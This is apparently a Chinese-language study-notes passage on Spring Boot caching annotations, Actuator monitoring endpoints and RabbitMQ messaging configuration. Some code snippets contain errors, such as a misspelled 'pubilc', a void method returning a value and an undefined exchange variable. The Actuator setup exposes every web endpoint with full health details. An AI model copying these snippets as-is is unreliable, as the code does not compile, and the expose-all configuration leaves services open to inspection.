<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Caching(</span></span><br><span class="line"><span class="meta">    cacheable = @Cacheable(&quot;user&quot;), </span></span><br><span class="line"><span class="meta">    evict = &#123; </span></span><br><span class="line"><span class="meta">        @CacheEvict(&quot;cache2&quot;),</span></span><br><span class="line"><span class="meta">   		@CacheEvict(value = &quot;cache3&quot;, allEntries = true) </span></span><br><span class="line"><span class="meta">    &#125;)</span></span><br><span class="line">   <span class="keyword">public</span> User <span class="title function_">find</span><span class="params">(Integer id)</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p><code>@CacheConfig</code>用在类上，用作公共的缓存配置。</p>
<h2 id="指标监控"><a href="#指标监控" class="headerlink" title="指标监控"></a>指标监控</h2><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">spring-boot-starter-actuator</span><br></pre></td></tr></table></figure>

<p>默认在<code>/actuator</code>路径下。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">HTTP默认开启Endpoint</span><br><span class="line">/actuator/info</span><br><span class="line">/actuator/health</span><br><span class="line">JMX默认开启所有Endpoint</span><br></pre></td></tr></table></figure>

<p>配置Endpoint</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">management:</span></span><br><span class="line">  <span class="attr">endpoints:</span> </span><br><span class="line">    <span class="attr">enable-by-default:</span> <span class="literal">true</span> <span class="comment"># 默认开启所有监控端点</span></span><br><span class="line">    <span class="attr">web:</span></span><br><span class="line">      <span class="attr">exposure:</span></span><br><span class="line">        <span class="attr">include:</span> <span class="string">&#x27;*&#x27;</span>  <span class="comment"># web 开启所有监控端点</span></span><br><span class="line">  <span class="attr">endpoint:</span> <span class="comment"># 配置某个端点</span></span><br><span class="line">    <span class="attr">health:</span></span><br><span class="line">      <span class="attr">show-details:</span> <span class="string">always</span></span><br><span class="line">      <span class="attr">enable:</span> <span class="literal">true</span> <span class="comment"># 如果关闭所有，则手动开启一个</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>自定义Health端点</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MytHealthIndicator</span> <span class="keyword">extends</span> <span class="title class_">AbstractHealthIndicator</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doHealthCheck</span><span class="params">(Health.Builder builder)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">            builder.up();</span><br><span class="line">            builder.status(Status.UP);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            builder.down();</span><br><span class="line">        &#125;</span><br><span class="line">        Map&lt;String, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;key&quot;</span>, <span class="number">0</span>);</span><br><span class="line">        builder.withDetails(map).withDetail(<span class="string">&quot;code&quot;</span>, <span class="number">100</span>);</span><br><span class="line">        <span class="keyword">return</span> builder;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>配置应用信息</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">info:</span></span><br><span class="line">  <span class="attr">appName:</span> <span class="string">name</span></span><br><span class="line">  <span class="attr">appVersion:</span> <span class="number">1.0</span><span class="number">.0</span></span><br><span class="line">  <span class="attr">mavenProjectName:</span> <span class="string">@project.artifactId@</span></span><br><span class="line">  <span class="attr">mavenProjectVersion:</span> <span class="string">@project.version@</span></span><br></pre></td></tr></table></figure>

<p>自定义其他端点</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="meta">@Endpoint(id=&quot;container&quot;)</span></span><br><span class="line">pubilc <span class="keyword">class</span> <span class="title class_">DockerEndpoint</span>() &#123;</span><br><span class="line">    <span class="meta">@ReadOperation</span></span><br><span class="line">    <span class="keyword">public</span> Map <span class="title function_">getDockerInfo</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>; <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@WriteOperation</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">restartDocker</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="消息队列"><a href="#消息队列" class="headerlink" title="消息队列"></a>消息队列</h2><h3 id="RabbitMQ"><a href="#RabbitMQ" class="headerlink" title="RabbitMQ"></a>RabbitMQ</h3><h4 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">spring-boot-starter-amqp</span><br></pre></td></tr></table></figure>

<p>消息队列内部包含两个部分，交换机和消息队列。交换机负责将消息路由到某一个消息队列，消息队列负责存储消息。</p>
<p>消息队列的四种工作模式：</p>
<ul>
<li>点对点 - Direct Exchange - 交换机将消息交给目标队列</li>
<li>广播 - Fanout Exchange - 交换机广播消息到所有队列上</li>
<li>通配符交换 - Topic Exchange - 交换机通过通配符将消息发送给某些队列，通配符有<code>*</code> ，<code>#</code></li>
<li>头部交换 - Headers Exchange - 根据头部转发消息</li>
</ul>
<p>此外，消息队列还支持负载均衡和事务机制。</p>
<p>配置消息队列，最好是能创建一个公共项目，为所有项目提供统一的队列配置。</p>
<p>配置文件如下：</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">    <span class="attr">rabbitmq:</span></span><br><span class="line">        <span class="attr">host:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">        <span class="attr">port:</span> <span class="number">5672</span></span><br><span class="line">        <span class="attr">username:</span> <span class="string">guest</span></span><br><span class="line">        <span class="attr">password:</span> <span class="string">guest</span></span><br></pre></td></tr></table></figure>

<p>对于生产者，创建配置类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DirectRabbitConfig</span> &#123;</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> Queue <span class="title function_">rabbitmqDemoDirectQueue</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 1、name:    队列名称</span></span><br><span class="line"><span class="comment">         * 2、durable: 是否持久化</span></span><br><span class="line"><span class="comment">         * 3、exclusive: 是否独享、排外的。如果设置为true，定义为排他队列。则只有创建者可以使用此队列。也就是private私有的。</span></span><br><span class="line"><span class="comment">         * 4、autoDelete: 是否自动删除。也就是临时队列。当最后一个消费者断开连接后，会自动删除。</span></span><br><span class="line"><span class="comment">         * */</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Queue</span>(RabbitMQConfig.RABBITMQ_DEMO_TOPIC, <span class="literal">true</span>, <span class="literal">false</span>, <span class="literal">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> DirectExchange <span class="title function_">rabbitmqDemoDirectExchange</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">//Direct交换机</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">DirectExchange</span>(RabbitMQConfig.RABBITMQ_DEMO_DIRECT_EXCHANGE, <span class="literal">true</span>, <span class="literal">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> Binding <span class="title function_">bindDirect</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">//链式写法，绑定交换机和队列，并设置匹配键</span></span><br><span class="line">        <span class="keyword">return</span> BindingBuilder</span><br><span class="line">                <span class="comment">//绑定队列</span></span><br><span class="line">                .bind(rabbitmqDemoDirectQueue())</span><br><span class="line">                <span class="comment">//到交换机</span></span><br><span class="line">                .to(rabbitmqDemoDirectExchange())</span><br><span class="line">                <span class="comment">//并设置匹配键</span></span><br><span class="line">                .with(RabbitMQConfig.RABBITMQ_DEMO_DIRECT_ROUTING);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>之后创建生产者</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 创建服务，用于发送消息</span></span><br><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RabbitMQServiceImpl</span> <span class="keyword">implements</span> <span class="title class_">RabbitMQService</span> &#123;</span><br><span class="line">    <span class="comment">//日期格式化</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">SimpleDateFormat</span> <span class="variable">sdf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleDateFormat</span>(<span class="string">&quot;yyyy-MM-dd HH:mm:ss&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">    <span class="keyword">private</span> RabbitTemplate rabbitTemplate;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sendMsg</span><span class="params">(String msg)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">msgId</span> <span class="operator">=</span> UUID.randomUUID().toString().replace(<span class="string">&quot;-&quot;</span>, <span class="string">&quot;&quot;</span>).substring(<span class="number">0</span>, <span class="number">32</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">sendTime</span> <span class="operator">=</span> sdf.format(<span class="keyword">new</span> <span class="title class_">Date</span>());</span><br><span class="line">            Map&lt;String, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">            map.put(<span class="string">&quot;msgId&quot;</span>, msgId);</span><br><span class="line">            map.put(<span class="string">&quot;sendTime&quot;</span>, sendTime);</span><br><span class="line">            map.put(<span class="string">&quot;msg&quot;</span>, msg);</span><br><span class="line">            rabbitTemplate.convertAndSend(RabbitMQConfig.RABBITMQ_DEMO_DIRECT_EXCHANGE, RabbitMQConfig.RABBITMQ_DEMO_DIRECT_ROUTING, map);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;ok&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;error&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建Controller，调用服务发送消息</span></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/mall/rabbitmq&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RabbitMQController</span> &#123;</span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">    <span class="keyword">private</span> RabbitMQService rabbitMQService;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 发送消息</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@author</span> java技术爱好者</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@PostMapping(&quot;/sendMsg&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sendMsg</span><span class="params">(<span class="meta">@RequestParam(name = &quot;msg&quot;)</span> String msg)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">return</span> rabbitMQService.sendMsg(msg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>对于消费者，使用<code>@RabbitListener</code>监听一个或多个消息队列。当消息队列中没有消息时，消费者可能会报错。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="comment">//使用queuesToDeclare属性，如果不存在则会创建队列</span></span><br><span class="line"><span class="meta">@RabbitListener(queuesToDeclare = @Queue(RabbitMQConfig.RABBITMQ_DEMO_TOPIC))</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RabbitDemoConsumer</span> &#123;</span><br><span class="line">    <span class="meta">@RabbitHandler</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">process</span><span class="params">(Map&lt;String, Object&gt; map)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;队列B收到消息：&quot;</span> + map.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="进阶使用"><a href="#进阶使用" class="headerlink" title="进阶使用"></a>进阶使用</h4><p>在需要动态增删消息队列的情况下，需要用<code>RabbitAdmin</code>或<code>AmqpAdmin</code>管理消息队列和交换机，将它们注入到Bean中。</p>
<p>对于directRabbitTemplate，可以设置接收消息的功能。默认情况下，Spring已经注册了一个用于接收返回消息的消息队列，当然也可以自己注册一个替换默认的接收消息的消息队列。这里使用了replyQueue。</p>
<p>在调用directRabbitTemplate等待消息的这一过程，可以设置为同步调用和异步调用两种方式。异步则是套一层Future。</p>
<p>对于Listener，一般是用Container管理一个线程池，用于接收并处理消息。这里定义了如下几种</p>
<ul>
<li>directRabbitTemplate的replyQueue使用的replyListenerContainer</li>
<li>pointListenerContainer</li>
<li>broadcastListenerContainer</li>
</ul>
<p>这些Container可以动态绑定Listener，可以动态设置监听的消息队列。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@EnableRabbit</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AmqpConfig</span> &#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    CachingConnectionFactory connectionFactory;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> RabbitAdmin <span class="title function_">rabbitAdmin</span><span class="params">(ConnectionFactory connectionFactory)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">RabbitAdmin</span>(connectionFactory);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> Queue <span class="title function_">replyQueue</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Queue</span>(<span class="string">&quot;reply&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> FanoutExchange <span class="title function_">fanoutExchange</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">FanoutExchange</span>(<span class="string">&quot;exchange.fanout&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> DirectExchange <span class="title function_">directExchange</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">DirectExchange</span>(<span class="string">&quot;exchange.direct&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> RabbitTemplate <span class="title function_">fanoutRabbitTemplate</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">RabbitTemplate</span> <span class="variable">rabbitTemplate</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RabbitTemplate</span>(connectionFactory);</span><br><span class="line">        rabbitTemplate.setExchange(fanoutExchange().getName());</span><br><span class="line">        <span class="keyword">return</span> rabbitTemplate;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> RabbitTemplate <span class="title function_">directRabbitTemplate</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">RabbitTemplate</span> <span class="variable">rabbitTemplate</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RabbitTemplate</span>(connectionFactory);</span><br><span class="line">        rabbitTemplate.setReplyAddress(replyQueue().getName());</span><br><span class="line">        rabbitTemplate.setReplyTimeout(<span class="number">3</span> * <span class="number">1000</span>);</span><br><span class="line">        rabbitTemplate.setUseDirectReplyToContainer(<span class="literal">false</span>);</span><br><span class="line">        <span class="keyword">return</span> rabbitTemplate;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> AsyncRabbitTemplate <span class="title function_">directAsyncRabbitTemplate</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">AsyncRabbitTemplate</span>(directRabbitTemplate());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> SimpleMessageListenerContainer <span class="title function_">replyListenerContainer</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">SimpleMessageListenerContainer</span> <span class="variable">container</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleMessageListenerContainer</span>();</span><br><span class="line">        container.setConnectionFactory(connectionFactory);</span><br><span class="line">        container.setQueues(replyQueue());</span><br><span class="line">        container.setMessageListener(directRabbitTemplate());</span><br><span class="line">        <span class="keyword">return</span> container;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> ThreadPoolTaskExecutor <span class="title function_">rabbitListenerTaskExecutor</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">ThreadPoolTaskExecutor</span> <span class="variable">executor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ThreadPoolTaskExecutor</span>();</span><br><span class="line">        executor.setMaxPoolSize(<span class="number">10</span>);</span><br><span class="line">        executor.setCorePoolSize(<span class="number">2</span>);</span><br><span class="line">        executor.setQueueCapacity(<span class="number">20</span>);</span><br><span class="line">        executor.setThreadNamePrefix(<span class="string">&quot;RabbitListenerExecutor-&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> executor;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> SimpleMessageListenerContainer <span class="title function_">pointListenerContainer</span><span class="params">(</span></span><br><span class="line"><span class="params">            SimpleRabbitListenerContainerFactory rabbitListenerContainerFactory)</span> &#123;</span><br><span class="line">        <span class="type">SimpleMessageListenerContainer</span> <span class="variable">container</span> <span class="operator">=</span> rabbitListenerContainerFactory.createListenerContainer();</span><br><span class="line">        container.setConcurrentConsumers(<span class="number">1</span>);</span><br><span class="line">        container.setMaxConcurrentConsumers(<span class="number">10</span>);</span><br><span class="line">        container.setTaskExecutor(rabbitListenerTaskExecutor());</span><br><span class="line">        container.setMessageListener(<span class="keyword">new</span> <span class="title class_">MessageListenerAdapter</span>(<span class="keyword">new</span> <span class="title class_">MessageHandler</span>()));</span><br><span class="line">        <span class="keyword">return</span> container;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> SimpleMessageListenerContainer <span class="title function_">broadcastListenerContainer</span><span class="params">(</span></span><br><span class="line"><span class="params">            SimpleRabbitListenerContainerFactory rabbitListenerContainerFactory)</span> &#123;</span><br><span class="line">        <span class="type">SimpleMessageListenerContainer</span> <span class="variable">container</span> <span class="operator">=</span> rabbitListenerContainerFactory.createListenerContainer();</span><br><span class="line">        container.setMessageListener(<span class="keyword">new</span> <span class="title class_">MessageListenerAdapter</span>(<span class="keyword">new</span> <span class="title class_">BroadcastHandler</span>()));</span><br><span class="line">        <span class="keyword">return</span> container;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>消息Listener的执行器定义为</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BroadcastHandler</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleMessage</span><span class="params">(String message, Object obj)</span>&#123;</span><br><span class="line">        System.out.println(message);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MessageHandler</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">handleMessage</span><span class="params">(String message)</span> &#123;</span><br><span class="line">        System.out.println(message);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;r  &quot;</span> + message;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="原生写法"><a href="#原生写法" class="headerlink" title="原生写法"></a>原生写法</h4><p>参考：<a href="https://www.cnblogs.com/niceyoo/p/11448104.html">RabbitMQ六种队列模式-发布订阅模式 - niceyoo - 博客园 (cnblogs.com)</a></p>
<p>RabbitMQ有三种交换机：Direct（点对点），Fanout（广播），Topic（发布订阅）。</p>
<p>默认情况下是点对点的通信方式。下面实现一种点对点的方式。</p>
<p>定义接收方的接口。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">ReceiverHandler</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">receive</span><span class="params">(String message)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后定义RabbitMQ的收发方法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RabbitManager</span> &#123;</span><br><span class="line">	<span class="comment">// 这里注入了ConnectionFactory，使用RabbitMQ的默认配置，也可以手动设置配置。</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">ConnectionFactory</span> <span class="variable">connectionFactory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConnectionFactory</span>();</span><br><span class="line">	</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">send</span><span class="params">(String queue, String message)</span> <span class="keyword">throws</span> IOException, TimeoutException &#123;</span><br><span class="line">        <span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> connectionFactory.newConnection();</span><br><span class="line">        <span class="comment">// 通过通道发送消息</span></span><br><span class="line">        <span class="type">Channel</span> <span class="variable">channel</span> <span class="operator">=</span> connection.createChannel();</span><br><span class="line">        <span class="comment">// 声明接收者的队列</span></span><br><span class="line">        channel.queueDeclare(queue, <span class="literal">false</span>, <span class="literal">false</span>, <span class="literal">false</span>, <span class="literal">null</span>);</span><br><span class="line">        channel.basicQos(<span class="number">1</span>);</span><br><span class="line">        <span class="comment">// 参数 1 为空，使用默认交换机</span></span><br><span class="line">        channel.basicPublish(<span class="string">&quot;&quot;</span>, queue, <span class="literal">null</span>, message.getBytes(StandardCharsets.UTF_8));</span><br><span class="line">        channel.close();</span><br><span class="line">        connection.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">registerReceiver</span><span class="params">(String queue, ReceiverHandler messageHandler)</span> <span class="keyword">throws</span> IOException, TimeoutException &#123;</span><br><span class="line">        <span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> connectionFactory.newConnection();</span><br><span class="line">        <span class="type">Channel</span> <span class="variable">channel</span> <span class="operator">=</span> connection.createChannel();</span><br><span class="line">        channel.queueDeclare(queue, <span class="literal">false</span>, <span class="literal">false</span>, <span class="literal">false</span>, <span class="literal">null</span>);</span><br><span class="line">        channel.basicQos(<span class="number">1</span>);</span><br><span class="line">        <span class="comment">// 定义消息的消费者</span></span><br><span class="line">        <span class="type">DefaultConsumer</span> <span class="variable">defaultConsumer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultConsumer</span>(channel) &#123;</span><br><span class="line">            <span class="meta">@SneakyThrows</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleDelivery</span><span class="params">(String consumerTag, Envelope envelope, AMQP.BasicProperties properties, <span class="type">byte</span>[] body)</span></span><br><span class="line">                    <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">msgString</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(body, StandardCharsets.UTF_8);</span><br><span class="line">                <span class="comment">// 调用接收消息的接口处理消息</span></span><br><span class="line">                messageHandler.receive(msgString);</span><br><span class="line">                <span class="comment">// 向生产者响应消息</span></span><br><span class="line">                channel.basicAck(envelope.getDeliveryTag(), <span class="literal">false</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        channel.basicConsume(queue, <span class="literal">false</span>, defaultConsumer);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果使用广播模式，则有</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">SubscribeHandler</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">subscribe</span><span class="params">(String message)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RabbitManager</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">fanoutExchange</span> <span class="operator">=</span> <span class="string">&quot;exchange.basic.fanout&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">ConnectionFactory</span> <span class="variable">connectionFactory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConnectionFactory</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">publish</span><span class="params">(String message)</span> <span class="keyword">throws</span> IOException, TimeoutException, InterruptedException &#123;</span><br><span class="line">        <span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> connectionFactory.newConnection();</span><br><span class="line">        <span class="type">Channel</span> <span class="variable">channel</span> <span class="operator">=</span> connection.createChannel();</span><br><span class="line">        channel.exchangeDeclare(topicExchange, <span class="string">&quot;fanout&quot;</span>);</span><br><span class="line">        channel.basicPublish(topicExchange, <span class="string">&quot;&quot;</span>, <span class="literal">null</span>, message.getBytes(StandardCharsets.UTF_8));</span><br><span class="line">        channel.close();</span><br><span class="line">        connection.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">registerSubscribe</span><span class="params">(String queue, SubscribeHandler messageHandler)</span> <span class="keyword">throws</span> IOException, TimeoutException &#123;</span><br><span class="line">        <span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> connectionFactory.newConnection();</span><br><span class="line">        <span class="type">Channel</span> <span class="variable">channel</span> <span class="operator">=</span> connection.createChannel();</span><br><span class="line">        channel.queueDeclare(queue, <span class="literal">false</span>, <span class="literal">false</span>, <span class="literal">false</span>, <span class="literal">null</span>);</span><br><span class="line">        channel.basicQos(<span class="number">1</span>);</span><br><span class="line">        channel.queueBind(queue, fanoutExchange, <span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="type">DefaultConsumer</span> <span class="variable">defaultConsumer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultConsumer</span>(channel) &#123;</span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleDelivery</span><span class="params">(String consumerTag, Envelope envelope, AMQP.BasicProperties properties, <span class="type">byte</span>[] body)</span></span><br><span class="line">                    <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">msgString</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(body, StandardCharsets.UTF_8);</span><br><span class="line">                messageHandler.subscribe(msgString);</span><br><span class="line">                channel.basicAck(envelope.getDeliveryTag(), <span class="literal">false</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        channel.basicConsume(queue, <span class="literal">false</span>, defaultConsumer);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>







<h3 id="ActiveMQ"><a href="#ActiveMQ" class="headerlink" title="ActiveMQ"></a>ActiveMQ</h3><p>基于 JMS 标准接口定义。</p>
